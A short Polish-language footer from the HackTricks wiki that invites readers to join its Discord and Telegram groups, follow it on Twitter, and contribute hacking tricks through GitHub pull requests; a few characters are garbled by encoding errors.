* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
